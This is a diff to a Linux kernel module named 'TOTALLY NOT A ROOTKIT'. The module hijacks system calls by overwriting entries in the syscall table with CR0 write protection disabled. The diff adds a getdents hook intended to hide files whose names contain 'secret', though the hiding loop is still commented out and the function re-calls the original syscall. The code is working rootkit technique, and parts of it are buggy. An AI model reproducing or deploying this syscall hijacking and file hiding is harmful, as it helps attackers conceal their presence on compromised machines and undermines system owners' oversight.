@@ -25,14 +25,22 @@ MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");
 
 static unsigned long *sys_call_table;	//points to kernel's syscall table
 
-
 //max numTargets
-#define numTargets 3
+#define numTargets 4
+#define secretString "secret"
+
 //MAKE CHANGES TO THE BELOW ARRAYS IN THE loadMod() function
 static int syscall_names[numTargets]; //array defining syscall name (macro index) for each target
 static void* original_syscallPtrs[numTargets]; //array to store ptrs to the original kernel syscall functions
 static void* totallyReal_syscallPtrs[numTargets]; //array to store ptrs to our fake syscall functions
 static bool toInject[numTargets] = {0};	//array to toggle which targets to intercept (default all 0 unless changed in loadMod)
+
+struct linux_dirent {
+	long d_ino;
+	off_t d_off;
+	unsigned short d_reclen;
+	char d_name[];
+};
 
 asmlinkage long totallyReal_read(int fd, char __user *buf, size_t count) {
 	pr_info("Intercepted read of fd=%d, %lu byes\n", fd, count);
@@ -51,6 +59,65 @@ asmlinkage int totallyReal_mkdir(const char *pathname, mode_t mode){
 	return ((typeof(sys_mkdir)*)(original_syscallPtrs[2]))(pathname, mode);
 }
 
+/***  Modified getdents to hide files that contain secret string in filename ***/
+asmlinkage long totallyReal_getdents (int fd, struct linux_dirent *dirp, int count) {
+	/* similar to sys_read, prints to log very frequently */
+	pr_info("fakeGetDents: %d %p %d\n", fd, dirp, count);
+	
+	int nread;
+	struct linux_dirent *mod_dirp;
+
+	// call original function to populate dirp
+	nread = ((typeof(sys_getdents)*)(original_syscallPtrs[3]))(fd, dirp, count);
+	if (nread == -1) {
+		pr_info("fakeGetDents: error calling original function\n");
+		return -1;
+	} else {
+		pr_info("fakeGetDents: read %d bytes from filename: %s\n", nread, dirp->d_name);
+	}
+
+	// construct a new modified struct linux_dirent that hides secret files
+	mod_dirp = kvmalloc(nread, GFP_KERNEL);
+	if (mod_dirp == NULL) {
+		pr_info("fakeGetDents: error allocating kernel space for modified dirp\n");
+		kvfree(mod_dirp);
+		return -1;
+	} else {
+		pr_info("fakeGetDents: successfully allocated %d bytes of space at address %p\n", nread, mod_dirp);
+	}
+
+	// copy contents of original dirp, which will be modified
+	copy_from_user(mod_dirp, dirp, nread);
+	pr_info("fakeGetDents: copied original dirp '%p' to new dirp '%p'\n", dirp, mod_dirp);
+
+// currently in the process of debugging, please do not touch
+/*
+	// iterate through all files and hide any with secret string in filename
+	int i, len = 0;
+	struct linux_dirent *p_dirp;
+	for (i = 0; i < nread; ) {
+		p_dirp = (struct linux_dirent *)(mod_dirp + i);
+		if (strstr(p_dirp->d_name, secretString) != NULL) {
+			pr_info("fakeGetDents: super secret file '%s'\n", p_dirp->d_name);
+		} else {
+			memcpy((void *)mod_dirp+len, p_dirp, p_dirp->d_reclen);
+			len += p_dirp->d_reclen;
+		}
+		i += p_dirp->d_reclen;
+	}
+*/
+
+	// copy contents of modified dirp back to original dirp
+	copy_to_user(dirp, mod_dirp, nread);	// change count back to len after testing
+	pr_info("fakeGetDents: copied modified dirp '%p' back to original dirp '%p'\n", mod_dirp, dirp);
+
+	// free allocated kernel space
+	kvfree(mod_dirp);
+	//return len;
+
+	return ((typeof(sys_getdents)*)(original_syscallPtrs[3]))(fd, dirp, count);
+}
+
 void injectSyscalls(void){
 	int targetIndex;
 	for(targetIndex = 0; targetIndex < numTargets; targetIndex++){
@@ -63,7 +130,7 @@ void injectSyscalls(void){
 			
 			//inject fake ptr
 			CR0_WRITE_UNLOCK({
-				sys_call_table[syscall_names[targetIndex]] = totallyReal_syscallPtrs[targetIndex];
+				sys_call_table[syscall_names[targetIndex]] = (void *)totallyReal_syscallPtrs[targetIndex];
 			});
 			pr_info("phony ptr injected as %p\n", (void *)sys_call_table[syscall_names[targetIndex]]);
 
@@ -81,7 +148,7 @@ void restoreSyscalls(void){
 		if(toInject[targetIndex]){
 			pr_info("Restoring ptr for target %d\n", targetIndex);
 			CR0_WRITE_UNLOCK({
-				sys_call_table[syscall_names[targetIndex]] = original_syscallPtrs[targetIndex];
+				sys_call_table[syscall_names[targetIndex]] = (void *)original_syscallPtrs[targetIndex];
 			});
 			pr_info("Ptr restored for target %d as %p\n", targetIndex, (void *)sys_call_table[syscall_names[targetIndex]]);
 		}
@@ -115,6 +182,10 @@ int __init loadMod(void){
 	syscall_names[2] = __NR_mkdir;
 	totallyReal_syscallPtrs[2] = (void *) &totallyReal_mkdir;
 	toInject[2] = 1;
+
+	syscall_names[3] = __NR_getdents;
+	totallyReal_syscallPtrs[3] = (void *) &totallyReal_getdents;
+	toInject[3] = 1;
 
 	injectSyscalls();
 
